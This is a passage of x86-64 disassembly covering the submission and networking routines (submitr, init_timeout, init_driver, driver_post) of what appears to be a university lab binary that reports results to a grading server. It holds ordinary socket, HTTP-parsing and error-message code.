  402e2e:       48 8d 84 10 80 00 00    lea    0x80(%rax,%rdx,1),%rax
  402e35:       00
  402e36:       48 3d 00 20 00 00       cmp    $0x2000,%rax
  402e3c:       0f 87 c2 02 00 00       ja     403104 <submitr+0x406>
  402e42:       48 8d b4 24 50 40 00    lea    0x4050(%rsp),%rsi
  402e49:       00
  402e4a:       b9 00 04 00 00          mov    $0x400,%ecx
  402e4f:       b8 00 00 00 00          mov    $0x0,%eax
  402e54:       48 89 f7                mov    %rsi,%rdi
  402e57:       f3 48 ab                rep stos %rax,%es:(%rdi)
  402e5a:       4c 89 ef                mov    %r13,%rdi
  402e5d:       e8 96 fd ff ff          call   402bf8 <urlencode>
  402e62:       85 c0                   test   %eax,%eax
  402e64:       0f 88 0d 03 00 00       js     403177 <submitr+0x479>
  402e6a:       4c 8d bc 24 50 20 00    lea    0x2050(%rsp),%r15
  402e71:       00
  402e72:       41 54                   push   %r12
  402e74:       48 8d 84 24 58 40 00    lea    0x4058(%rsp),%rax
  402e7b:       00
  402e7c:       50                      push   %rax
  402e7d:       4d 89 f1                mov    %r14,%r9
  402e80:       4c 8b 44 24 18          mov    0x18(%rsp),%r8
  402e85:       48 8d 0d 6c 18 00 00    lea    0x186c(%rip),%rcx        # 4046f8 <trans_char+0x38>
  402e8c:       ba 00 20 00 00          mov    $0x2000,%edx
  402e91:       be 01 00 00 00          mov    $0x1,%esi
  402e96:       4c 89 ff                mov    %r15,%rdi
  402e99:       b8 00 00 00 00          mov    $0x0,%eax
  402e9e:       e8 cd e5 ff ff          call   401470 <__sprintf_chk@plt>
  402ea3:       4c 89 ff                mov    %r15,%rdi
  402ea6:       e8 35 e4 ff ff          call   4012e0 <strlen@plt>
  402eab:       48 89 c2                mov    %rax,%rdx
  402eae:       4c 89 fe                mov    %r15,%rsi
  402eb1:       89 df                   mov    %ebx,%edi
  402eb3:       e8 b1 fb ff ff          call   402a69 <rio_writen>
  402eb8:       48 83 c4 10             add    $0x10,%rsp
  402ebc:       48 85 c0                test   %rax,%rax
  402ebf:       0f 88 3d 03 00 00       js     403202 <submitr+0x504>
  402ec5:       4c 8d 64 24 40          lea    0x40(%rsp),%r12
  402eca:       89 de                   mov    %ebx,%esi
  402ecc:       4c 89 e7                mov    %r12,%rdi
  402ecf:       e8 4d fb ff ff          call   402a21 <rio_readinitb>
  402ed4:       48 8d b4 24 50 20 00    lea    0x2050(%rsp),%rsi
  402edb:       00
  402edc:       ba 00 20 00 00          mov    $0x2000,%edx
  402ee1:       4c 89 e7                mov    %r12,%rdi
  402ee4:       e8 6e fc ff ff          call   402b57 <rio_readlineb>
  402ee9:       48 85 c0                test   %rax,%rax
  402eec:       0f 8e 7f 03 00 00       jle    403271 <submitr+0x573>
  402ef2:       48 8d 4c 24 2c          lea    0x2c(%rsp),%rcx
  402ef7:       48 8d 94 24 50 60 00    lea    0x6050(%rsp),%rdx
  402efe:       00
  402eff:       48 8d bc 24 50 20 00    lea    0x2050(%rsp),%rdi
  402f06:       00
  402f07:       4c 8d 84 24 50 80 00    lea    0x8050(%rsp),%r8
  402f0e:       00
  402f0f:       48 8d 35 56 18 00 00    lea    0x1856(%rip),%rsi        # 40476c <trans_char+0xac>
  402f16:       b8 00 00 00 00          mov    $0x0,%eax
  402f1b:       e8 a0 e4 ff ff          call   4013c0 <__isoc99_sscanf@plt>
  402f20:       48 8d bc 24 50 20 00    lea    0x2050(%rsp),%rdi
  402f27:       00
  402f28:       48 8d 35 54 18 00 00    lea    0x1854(%rip),%rsi        # 404783 <trans_char+0xc3>
  402f2f:       e8 0c e4 ff ff          call   401340 <strcmp@plt>
  402f34:       85 c0                   test   %eax,%eax
  402f36:       0f 84 b3 03 00 00       je     4032ef <submitr+0x5f1>
  402f3c:       48 8d b4 24 50 20 00    lea    0x2050(%rsp),%rsi
  402f43:       00
  402f44:       48 8d 7c 24 40          lea    0x40(%rsp),%rdi
  402f49:       ba 00 20 00 00          mov    $0x2000,%edx
  402f4e:       e8 04 fc ff ff          call   402b57 <rio_readlineb>
  402f53:       48 85 c0                test   %rax,%rax
  402f56:       7f c8                   jg     402f20 <submitr+0x222>
  402f58:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  402f5f:       3a 20 43
  402f62:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  402f69:       20 75 6e
  402f6c:       48 89 45 00             mov    %rax,0x0(%rbp)
  402f70:       48 89 55 08             mov    %rdx,0x8(%rbp)
  402f74:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  402f7b:       74 6f 20
  402f7e:       48 ba 72 65 61 64 20    movabs $0x6165682064616572,%rdx
  402f85:       68 65 61
  402f88:       48 89 45 10             mov    %rax,0x10(%rbp)
  402f8c:       48 89 55 18             mov    %rdx,0x18(%rbp)
  402f90:       48 b8 64 65 72 73 20    movabs $0x6f72662073726564,%rax
  402f97:       66 72 6f
  402f9a:       48 ba 6d 20 74 68 65    movabs $0x657220656874206d,%rdx
  402fa1:       20 72 65
  402fa4:       48 89 45 20             mov    %rax,0x20(%rbp)
  402fa8:       48 89 55 28             mov    %rdx,0x28(%rbp)
  402fac:       48 b8 73 75 6c 74 20    movabs $0x72657320746c7573,%rax
  402fb3:       73 65 72
  402fb6:       48 89 45 30             mov    %rax,0x30(%rbp)
  402fba:       c7 45 38 76 65 72 00    movl   $0x726576,0x38(%rbp)
  402fc1:       89 df                   mov    %ebx,%edi
  402fc3:       e8 68 e3 ff ff          call   401330 <close@plt>
  402fc8:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  402fcd:       48 8b 94 24 58 a0 00    mov    0xa058(%rsp),%rdx
  402fd4:       00
  402fd5:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
  402fdc:       00 00
  402fde:       0f 85 5c 04 00 00       jne    403440 <submitr+0x742>
  402fe4:       48 81 c4 68 a0 00 00    add    $0xa068,%rsp
  402feb:       5b                      pop    %rbx
  402fec:       5d                      pop    %rbp
  402fed:       41 5c                   pop    %r12
  402fef:       41 5d                   pop    %r13
  402ff1:       41 5e                   pop    %r14
  402ff3:       41 5f                   pop    %r15
  402ff5:       c3                      ret
  402ff6:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  402ffd:       3a 20 43
  403000:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  403007:       20 75 6e
  40300a:       48 89 45 00             mov    %rax,0x0(%rbp)
  40300e:       48 89 55 08             mov    %rdx,0x8(%rbp)
  403012:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  403019:       74 6f 20
  40301c:       48 ba 63 72 65 61 74    movabs $0x7320657461657263,%rdx
  403023:       65 20 73
  403026:       48 89 45 10             mov    %rax,0x10(%rbp)
  40302a:       48 89 55 18             mov    %rdx,0x18(%rbp)
  40302e:       c7 45 20 6f 63 6b 65    movl   $0x656b636f,0x20(%rbp)
  403035:       66 c7 45 24 74 00       movw   $0x74,0x24(%rbp)
  40303b:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  403040:       eb 8b                   jmp    402fcd <submitr+0x2cf>
  403042:       48 b8 45 72 72 6f 72    movabs $0x44203a726f727245,%rax
  403049:       3a 20 44
  40304c:       48 ba 4e 53 20 69 73    movabs $0x6e7520736920534e,%rdx
  403053:       20 75 6e
  403056:       48 89 45 00             mov    %rax,0x0(%rbp)
  40305a:       48 89 55 08             mov    %rdx,0x8(%rbp)
  40305e:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  403065:       74 6f 20
  403068:       48 ba 72 65 73 6f 6c    movabs $0x2065766c6f736572,%rdx
  40306f:       76 65 20
  403072:       48 89 45 10             mov    %rax,0x10(%rbp)
  403076:       48 89 55 18             mov    %rdx,0x18(%rbp)
  40307a:       48 b8 73 65 72 76 65    movabs $0x6120726576726573,%rax
  403081:       72 20 61
  403084:       48 89 45 20             mov    %rax,0x20(%rbp)
  403088:       c7 45 28 64 64 72 65    movl   $0x65726464,0x28(%rbp)
  40308f:       66 c7 45 2c 73 73       movw   $0x7373,0x2c(%rbp)
  403095:       c6 45 2e 00             movb   $0x0,0x2e(%rbp)
  403099:       89 df                   mov    %ebx,%edi
  40309b:       e8 90 e2 ff ff          call   401330 <close@plt>
  4030a0:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  4030a5:       e9 23 ff ff ff          jmp    402fcd <submitr+0x2cf>
  4030aa:       48 b8 45 72 72 6f 72    movabs $0x55203a726f727245,%rax
  4030b1:       3a 20 55
  4030b4:       48 ba 6e 61 62 6c 65    movabs $0x6f7420656c62616e,%rdx
  4030bb:       20 74 6f
  4030be:       48 89 45 00             mov    %rax,0x0(%rbp)
  4030c2:       48 89 55 08             mov    %rdx,0x8(%rbp)
  4030c6:       48 b8 20 63 6f 6e 6e    movabs $0x7463656e6e6f6320,%rax
  4030cd:       65 63 74
  4030d0:       48 ba 20 74 6f 20 74    movabs $0x20656874206f7420,%rdx
  4030d7:       68 65 20
  4030da:       48 89 45 10             mov    %rax,0x10(%rbp)
  4030de:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4030e2:       c7 45 20 73 65 72 76    movl   $0x76726573,0x20(%rbp)
  4030e9:       66 c7 45 24 65 72       movw   $0x7265,0x24(%rbp)
  4030ef:       c6 45 26 00             movb   $0x0,0x26(%rbp)
  4030f3:       89 df                   mov    %ebx,%edi
  4030f5:       e8 36 e2 ff ff          call   401330 <close@plt>
  4030fa:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  4030ff:       e9 c9 fe ff ff          jmp    402fcd <submitr+0x2cf>
  403104:       48 b8 45 72 72 6f 72    movabs $0x52203a726f727245,%rax
  40310b:       3a 20 52
  40310e:       48 ba 65 73 75 6c 74    movabs $0x747320746c757365,%rdx
  403115:       20 73 74
  403118:       48 89 45 00             mov    %rax,0x0(%rbp)
  40311c:       48 89 55 08             mov    %rdx,0x8(%rbp)
  403120:       48 b8 72 69 6e 67 20    movabs $0x6f6f7420676e6972,%rax
  403127:       74 6f 6f
  40312a:       48 ba 20 6c 61 72 67    movabs $0x202e656772616c20,%rdx
  403131:       65 2e 20
  403134:       48 89 45 10             mov    %rax,0x10(%rbp)
  403138:       48 89 55 18             mov    %rdx,0x18(%rbp)
  40313c:       48 b8 49 6e 63 72 65    movabs $0x6573616572636e49,%rax
  403143:       61 73 65
  403146:       48 ba 20 53 55 42 4d    movabs $0x5254494d42555320,%rdx
  40314d:       49 54 52
  403150:       48 89 45 20             mov    %rax,0x20(%rbp)
  403154:       48 89 55 28             mov    %rdx,0x28(%rbp)
  403158:       48 b8 5f 4d 41 58 42    movabs $0x46554258414d5f,%rax
  40315f:       55 46 00
  403162:       48 89 45 30             mov    %rax,0x30(%rbp)
  403166:       89 df                   mov    %ebx,%edi
  403168:       e8 c3 e1 ff ff          call   401330 <close@plt>
  40316d:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  403172:       e9 56 fe ff ff          jmp    402fcd <submitr+0x2cf>
  403177:       48 b8 45 72 72 6f 72    movabs $0x52203a726f727245,%rax
  40317e:       3a 20 52
  403181:       48 ba 65 73 75 6c 74    movabs $0x747320746c757365,%rdx
  403188:       20 73 74
  40318b:       48 89 45 00             mov    %rax,0x0(%rbp)
  40318f:       48 89 55 08             mov    %rdx,0x8(%rbp)
  403193:       48 b8 72 69 6e 67 20    movabs $0x6e6f6320676e6972,%rax
  40319a:       63 6f 6e
  40319d:       48 ba 74 61 69 6e 73    movabs $0x6e6120736e696174,%rdx
  4031a4:       20 61 6e
  4031a7:       48 89 45 10             mov    %rax,0x10(%rbp)
  4031ab:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4031af:       48 b8 20 69 6c 6c 65    movabs $0x6c6167656c6c6920,%rax
  4031b6:       67 61 6c
  4031b9:       48 ba 20 6f 72 20 75    movabs $0x72706e7520726f20,%rdx
  4031c0:       6e 70 72
  4031c3:       48 89 45 20             mov    %rax,0x20(%rbp)
  4031c7:       48 89 55 28             mov    %rdx,0x28(%rbp)
  4031cb:       48 b8 69 6e 74 61 62    movabs $0x20656c6261746e69,%rax
  4031d2:       6c 65 20
  4031d5:       48 ba 63 68 61 72 61    movabs $0x6574636172616863,%rdx
  4031dc:       63 74 65
  4031df:       48 89 45 30             mov    %rax,0x30(%rbp)
  4031e3:       48 89 55 38             mov    %rdx,0x38(%rbp)
  4031e7:       66 c7 45 40 72 2e       movw   $0x2e72,0x40(%rbp)
  4031ed:       c6 45 42 00             movb   $0x0,0x42(%rbp)
  4031f1:       89 df                   mov    %ebx,%edi
  4031f3:       e8 38 e1 ff ff          call   401330 <close@plt>
  4031f8:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  4031fd:       e9 cb fd ff ff          jmp    402fcd <submitr+0x2cf>
  403202:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  403209:       3a 20 43
  40320c:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  403213:       20 75 6e
  403216:       48 89 45 00             mov    %rax,0x0(%rbp)
  40321a:       48 89 55 08             mov    %rdx,0x8(%rbp)
  40321e:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  403225:       74 6f 20
  403228:       48 ba 77 72 69 74 65    movabs $0x6f74206574697277,%rdx
  40322f:       20 74 6f
  403232:       48 89 45 10             mov    %rax,0x10(%rbp)
  403236:       48 89 55 18             mov    %rdx,0x18(%rbp)
  40323a:       48 b8 20 74 68 65 20    movabs $0x7365722065687420,%rax
  403241:       72 65 73
  403244:       48 ba 75 6c 74 20 73    movabs $0x7672657320746c75,%rdx
  40324b:       65 72 76
  40324e:       48 89 45 20             mov    %rax,0x20(%rbp)
  403252:       48 89 55 28             mov    %rdx,0x28(%rbp)
  403256:       66 c7 45 30 65 72       movw   $0x7265,0x30(%rbp)
  40325c:       c6 45 32 00             movb   $0x0,0x32(%rbp)
  403260:       89 df                   mov    %ebx,%edi
  403262:       e8 c9 e0 ff ff          call   401330 <close@plt>
  403267:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  40326c:       e9 5c fd ff ff          jmp    402fcd <submitr+0x2cf>
  403271:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  403278:       3a 20 43
  40327b:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  403282:       20 75 6e
  403285:       48 89 45 00             mov    %rax,0x0(%rbp)
  403289:       48 89 55 08             mov    %rdx,0x8(%rbp)
  40328d:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  403294:       74 6f 20
  403297:       48 ba 72 65 61 64 20    movabs $0x7269662064616572,%rdx
  40329e:       66 69 72
  4032a1:       48 89 45 10             mov    %rax,0x10(%rbp)
  4032a5:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4032a9:       48 b8 73 74 20 68 65    movabs $0x6564616568207473,%rax
  4032b0:       61 64 65
  4032b3:       48 ba 72 20 66 72 6f    movabs $0x72206d6f72662072,%rdx
  4032ba:       6d 20 72
  4032bd:       48 89 45 20             mov    %rax,0x20(%rbp)
  4032c1:       48 89 55 28             mov    %rdx,0x28(%rbp)
  4032c5:       48 b8 65 73 75 6c 74    movabs $0x657320746c757365,%rax
  4032cc:       20 73 65
  4032cf:       48 89 45 30             mov    %rax,0x30(%rbp)
  4032d3:       c7 45 38 72 76 65 72    movl   $0x72657672,0x38(%rbp)
  4032da:       c6 45 3c 00             movb   $0x0,0x3c(%rbp)
  4032de:       89 df                   mov    %ebx,%edi
  4032e0:       e8 4b e0 ff ff          call   401330 <close@plt>
  4032e5:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  4032ea:       e9 de fc ff ff          jmp    402fcd <submitr+0x2cf>
  4032ef:       48 8d b4 24 50 20 00    lea    0x2050(%rsp),%rsi
  4032f6:       00
  4032f7:       48 8d 7c 24 40          lea    0x40(%rsp),%rdi
  4032fc:       ba 00 20 00 00          mov    $0x2000,%edx
  403301:       e8 51 f8 ff ff          call   402b57 <rio_readlineb>
  403306:       48 85 c0                test   %rax,%rax
  403309:       7e 78                   jle    403383 <submitr+0x685>
  40330b:       44 8b 44 24 2c          mov    0x2c(%rsp),%r8d
  403310:       41 81 f8 c8 00 00 00    cmp    $0xc8,%r8d
  403317:       0f 85 ea 00 00 00       jne    403407 <submitr+0x709>
  40331d:       48 8d b4 24 50 20 00    lea    0x2050(%rsp),%rsi
  403324:       00
  403325:       48 89 ef                mov    %rbp,%rdi
  403328:       e8 73 df ff ff          call   4012a0 <strcpy@plt>
  40332d:       89 df                   mov    %ebx,%edi
  40332f:       e8 fc df ff ff          call   401330 <close@plt>
  403334:       48 8d 35 42 14 00 00    lea    0x1442(%rip),%rsi        # 40477d <trans_char+0xbd>
  40333b:       48 89 ef                mov    %rbp,%rdi
  40333e:       e8 fd df ff ff          call   401340 <strcmp@plt>
  403343:       85 c0                   test   %eax,%eax
  403345:       0f 84 82 fc ff ff       je     402fcd <submitr+0x2cf>
  40334b:       48 8d 35 2f 14 00 00    lea    0x142f(%rip),%rsi        # 404781 <trans_char+0xc1>
  403352:       48 89 ef                mov    %rbp,%rdi
  403355:       e8 e6 df ff ff          call   401340 <strcmp@plt>
  40335a:       85 c0                   test   %eax,%eax
  40335c:       0f 84 6b fc ff ff       je     402fcd <submitr+0x2cf>
  403362:       48 8d 35 1d 14 00 00    lea    0x141d(%rip),%rsi        # 404786 <trans_char+0xc6>
  403369:       48 89 ef                mov    %rbp,%rdi
  40336c:       e8 cf df ff ff          call   401340 <strcmp@plt>
  403371:       85 c0                   test   %eax,%eax
  403373:       0f 84 54 fc ff ff       je     402fcd <submitr+0x2cf>
  403379:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  40337e:       e9 4a fc ff ff          jmp    402fcd <submitr+0x2cf>
  403383:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  40338a:       3a 20 43
  40338d:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  403394:       20 75 6e
  403397:       48 89 45 00             mov    %rax,0x0(%rbp)
  40339b:       48 89 55 08             mov    %rdx,0x8(%rbp)
  40339f:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  4033a6:       74 6f 20
  4033a9:       48 ba 72 65 61 64 20    movabs $0x6174732064616572,%rdx
  4033b0:       73 74 61
  4033b3:       48 89 45 10             mov    %rax,0x10(%rbp)
  4033b7:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4033bb:       48 b8 74 75 73 20 6d    movabs $0x7373656d20737574,%rax
  4033c2:       65 73 73
  4033c5:       48 ba 61 67 65 20 66    movabs $0x6d6f726620656761,%rdx
  4033cc:       72 6f 6d
  4033cf:       48 89 45 20             mov    %rax,0x20(%rbp)
  4033d3:       48 89 55 28             mov    %rdx,0x28(%rbp)
  4033d7:       48 b8 20 72 65 73 75    movabs $0x20746c7573657220,%rax
  4033de:       6c 74 20
  4033e1:       48 89 45 30             mov    %rax,0x30(%rbp)
  4033e5:       c7 45 38 73 65 72 76    movl   $0x76726573,0x38(%rbp)
  4033ec:       66 c7 45 3c 65 72       movw   $0x7265,0x3c(%rbp)
  4033f2:       c6 45 3e 00             movb   $0x0,0x3e(%rbp)
  4033f6:       89 df                   mov    %ebx,%edi
  4033f8:       e8 33 df ff ff          call   401330 <close@plt>
  4033fd:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  403402:       e9 c6 fb ff ff          jmp    402fcd <submitr+0x2cf>
  403407:       4c 8d 8c 24 50 80 00    lea    0x8050(%rsp),%r9
  40340e:       00
  40340f:       48 8d 0d 22 13 00 00    lea    0x1322(%rip),%rcx        # 404738 <trans_char+0x78>
  403416:       48 c7 c2 ff ff ff ff    mov    $0xffffffffffffffff,%rdx
  40341d:       be 01 00 00 00          mov    $0x1,%esi
  403422:       48 89 ef                mov    %rbp,%rdi
  403425:       b8 00 00 00 00          mov    $0x0,%eax
  40342a:       e8 41 e0 ff ff          call   401470 <__sprintf_chk@plt>
  40342f:       89 df                   mov    %ebx,%edi
  403431:       e8 fa de ff ff          call   401330 <close@plt>
  403436:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  40343b:       e9 8d fb ff ff          jmp    402fcd <submitr+0x2cf>
  403440:       e8 ab de ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000403445 <init_timeout>:
  403445:       f3 0f 1e fa             endbr64
  403449:       85 ff                   test   %edi,%edi
  40344b:       74 26                   je     403473 <init_timeout+0x2e>
  40344d:       53                      push   %rbx
  40344e:       89 fb                   mov    %edi,%ebx
  403450:       78 1a                   js     40346c <init_timeout+0x27>
  403452:       48 8d 35 da f5 ff ff    lea    -0xa26(%rip),%rsi        # 402a33 <sigalrm_handler>
  403459:       bf 0e 00 00 00          mov    $0xe,%edi
  40345e:       e8 ed de ff ff          call   401350 <signal@plt>
  403463:       89 df                   mov    %ebx,%edi
  403465:       e8 b6 de ff ff          call   401320 <alarm@plt>
  40346a:       5b                      pop    %rbx
  40346b:       c3                      ret
  40346c:       bb 00 00 00 00          mov    $0x0,%ebx
  403471:       eb df                   jmp    403452 <init_timeout+0xd>
  403473:       c3                      ret

0000000000403474 <init_driver>:
  403474:       f3 0f 1e fa             endbr64
  403478:       41 54                   push   %r12
  40347a:       55                      push   %rbp
  40347b:       53                      push   %rbx
  40347c:       48 83 ec 20             sub    $0x20,%rsp
  403480:       48 89 fd                mov    %rdi,%rbp
  403483:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  40348a:       00 00
  40348c:       48 89 44 24 18          mov    %rax,0x18(%rsp)
  403491:       31 c0                   xor    %eax,%eax
  403493:       be 01 00 00 00          mov    $0x1,%esi
  403498:       bf 0d 00 00 00          mov    $0xd,%edi
  40349d:       e8 ae de ff ff          call   401350 <signal@plt>
  4034a2:       be 01 00 00 00          mov    $0x1,%esi
  4034a7:       bf 1d 00 00 00          mov    $0x1d,%edi
  4034ac:       e8 9f de ff ff          call   401350 <signal@plt>
  4034b1:       be 01 00 00 00          mov    $0x1,%esi
  4034b6:       bf 1d 00 00 00          mov    $0x1d,%edi
  4034bb:       e8 90 de ff ff          call   401350 <signal@plt>
  4034c0:       ba 00 00 00 00          mov    $0x0,%edx
  4034c5:       be 01 00 00 00          mov    $0x1,%esi
  4034ca:       bf 02 00 00 00          mov    $0x2,%edi
  4034cf:       e8 ac df ff ff          call   401480 <socket@plt>
  4034d4:       85 c0                   test   %eax,%eax
  4034d6:       0f 88 9c 00 00 00       js     403578 <init_driver+0x104>
  4034dc:       89 c3                   mov    %eax,%ebx
  4034de:       48 8d 3d a4 12 00 00    lea    0x12a4(%rip),%rdi        # 404789 <trans_char+0xc9>
  4034e5:       e8 76 de ff ff          call   401360 <gethostbyname@plt>
  4034ea:       48 85 c0                test   %rax,%rax
  4034ed:       0f 84 d1 00 00 00       je     4035c4 <init_driver+0x150>
  4034f3:       49 89 e4                mov    %rsp,%r12
  4034f6:       48 c7 04 24 00 00 00    movq   $0x0,(%rsp)
  4034fd:       00
  4034fe:       48 c7 44 24 08 00 00    movq   $0x0,0x8(%rsp)
  403505:       00 00
  403507:       66 c7 04 24 02 00       movw   $0x2,(%rsp)
  40350d:       48 63 50 14             movslq 0x14(%rax),%rdx
  403511:       48 8b 40 18             mov    0x18(%rax),%rax
  403515:       48 8b 30                mov    (%rax),%rsi
  403518:       48 8d 7c 24 04          lea    0x4(%rsp),%rdi
  40351d:       b9 0c 00 00 00          mov    $0xc,%ecx
  403522:       e8 49 de ff ff          call   401370 <__memmove_chk@plt>
  403527:       66 c7 44 24 02 3c 9a    movw   $0x9a3c,0x2(%rsp)
  40352e:       ba 10 00 00 00          mov    $0x10,%edx
  403533:       4c 89 e6                mov    %r12,%rsi
  403536:       89 df                   mov    %ebx,%edi
  403538:       e8 03 df ff ff          call   401440 <connect@plt>
  40353d:       85 c0                   test   %eax,%eax
  40353f:       0f 88 e7 00 00 00       js     40362c <init_driver+0x1b8>
  403545:       89 df                   mov    %ebx,%edi
  403547:       e8 e4 dd ff ff          call   401330 <close@plt>
  40354c:       66 c7 45 00 4f 4b       movw   $0x4b4f,0x0(%rbp)
  403552:       c6 45 02 00             movb   $0x0,0x2(%rbp)
  403556:       b8 00 00 00 00          mov    $0x0,%eax
  40355b:       48 8b 54 24 18          mov    0x18(%rsp),%rdx
  403560:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
  403567:       00 00
  403569:       0f 85 2f 01 00 00       jne    40369e <init_driver+0x22a>
  40356f:       48 83 c4 20             add    $0x20,%rsp
  403573:       5b                      pop    %rbx
  403574:       5d                      pop    %rbp
  403575:       41 5c                   pop    %r12
  403577:       c3                      ret
  403578:       48 b8 45 72 72 6f 72    movabs $0x43203a726f727245,%rax
  40357f:       3a 20 43
  403582:       48 ba 6c 69 65 6e 74    movabs $0x6e7520746e65696c,%rdx
  403589:       20 75 6e
  40358c:       48 89 45 00             mov    %rax,0x0(%rbp)
  403590:       48 89 55 08             mov    %rdx,0x8(%rbp)
  403594:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  40359b:       74 6f 20
  40359e:       48 ba 63 72 65 61 74    movabs $0x7320657461657263,%rdx
  4035a5:       65 20 73
  4035a8:       48 89 45 10             mov    %rax,0x10(%rbp)
  4035ac:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4035b0:       c7 45 20 6f 63 6b 65    movl   $0x656b636f,0x20(%rbp)
  4035b7:       66 c7 45 24 74 00       movw   $0x74,0x24(%rbp)
  4035bd:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  4035c2:       eb 97                   jmp    40355b <init_driver+0xe7>
  4035c4:       48 b8 45 72 72 6f 72    movabs $0x44203a726f727245,%rax
  4035cb:       3a 20 44
  4035ce:       48 ba 4e 53 20 69 73    movabs $0x6e7520736920534e,%rdx
  4035d5:       20 75 6e
  4035d8:       48 89 45 00             mov    %rax,0x0(%rbp)
  4035dc:       48 89 55 08             mov    %rdx,0x8(%rbp)
  4035e0:       48 b8 61 62 6c 65 20    movabs $0x206f7420656c6261,%rax
  4035e7:       74 6f 20
  4035ea:       48 ba 72 65 73 6f 6c    movabs $0x2065766c6f736572,%rdx
  4035f1:       76 65 20
  4035f4:       48 89 45 10             mov    %rax,0x10(%rbp)
  4035f8:       48 89 55 18             mov    %rdx,0x18(%rbp)
  4035fc:       48 b8 73 65 72 76 65    movabs $0x6120726576726573,%rax
  403603:       72 20 61
  403606:       48 89 45 20             mov    %rax,0x20(%rbp)
  40360a:       c7 45 28 64 64 72 65    movl   $0x65726464,0x28(%rbp)
  403611:       66 c7 45 2c 73 73       movw   $0x7373,0x2c(%rbp)
  403617:       c6 45 2e 00             movb   $0x0,0x2e(%rbp)
  40361b:       89 df                   mov    %ebx,%edi
  40361d:       e8 0e dd ff ff          call   401330 <close@plt>
  403622:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  403627:       e9 2f ff ff ff          jmp    40355b <init_driver+0xe7>
  40362c:       48 b8 31 30 2e 31 36    movabs $0x312e3036312e3031,%rax
  403633:       30 2e 31
  403636:       48 89 45 00             mov    %rax,0x0(%rbp)
  40363a:       c7 45 08 30 36 2e 31    movl   $0x312e3630,0x8(%rbp)
  403641:       66 c7 45 0c 39 30       movw   $0x3039,0xc(%rbp)
  403647:       c6 45 0e 00             movb   $0x0,0xe(%rbp)
  40364b:       48 b8 45 72 72 6f 72    movabs $0x55203a726f727245,%rax
  403652:       3a 20 55
  403655:       48 ba 6e 61 62 6c 65    movabs $0x6f7420656c62616e,%rdx
  40365c:       20 74 6f
  40365f:       48 89 45 00             mov    %rax,0x0(%rbp)
  403663:       48 89 55 08             mov    %rdx,0x8(%rbp)
  403667:       48 b8 20 63 6f 6e 6e    movabs $0x7463656e6e6f6320,%rax
  40366e:       65 63 74
  403671:       48 ba 20 74 6f 20 73    movabs $0x76726573206f7420,%rdx
  403678:       65 72 76
  40367b:       48 89 45 10             mov    %rax,0x10(%rbp)
  40367f:       48 89 55 18             mov    %rdx,0x18(%rbp)
  403683:       66 c7 45 20 65 72       movw   $0x7265,0x20(%rbp)
  403689:       c6 45 22 00             movb   $0x0,0x22(%rbp)
  40368d:       89 df                   mov    %ebx,%edi
  40368f:       e8 9c dc ff ff          call   401330 <close@plt>
  403694:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  403699:       e9 bd fe ff ff          jmp    40355b <init_driver+0xe7>
  40369e:       e8 4d dc ff ff          call   4012f0 <__stack_chk_fail@plt>

00000000004036a3 <driver_post>:
  4036a3:       f3 0f 1e fa             endbr64
  4036a7:       53                      push   %rbx
  4036a8:       4c 89 cb                mov    %r9,%rbx
  4036ab:       45 85 c0                test   %r8d,%r8d
  4036ae:       75 18                   jne    4036c8 <driver_post+0x25>
  4036b0:       48 85 ff                test   %rdi,%rdi
  4036b3:       74 05                   je     4036ba <driver_post+0x17>
  4036b5:       80 3f 00                cmpb   $0x0,(%rdi)
  4036b8:       75 37                   jne    4036f1 <driver_post+0x4e>
  4036ba:       66 c7 03 4f 4b          movw   $0x4b4f,(%rbx)
  4036bf:       c6 43 02 00             movb   $0x0,0x2(%rbx)
  4036c3:       44 89 c0                mov    %r8d,%eax
  4036c6:       5b                      pop    %rbx
  4036c7:       c3                      ret
  4036c8:       48 89 ca                mov    %rcx,%rdx
  4036cb:       48 8d 35 c6 10 00 00    lea    0x10c6(%rip),%rsi        # 404798 <trans_char+0xd8>
  4036d2:       bf 01 00 00 00          mov    $0x1,%edi
  4036d7:       b8 00 00 00 00          mov    $0x0,%eax
  4036dc:       e8 ff dc ff ff          call   4013e0 <__printf_chk@plt>
  4036e1:       66 c7 03 4f 4b          movw   $0x4b4f,(%rbx)
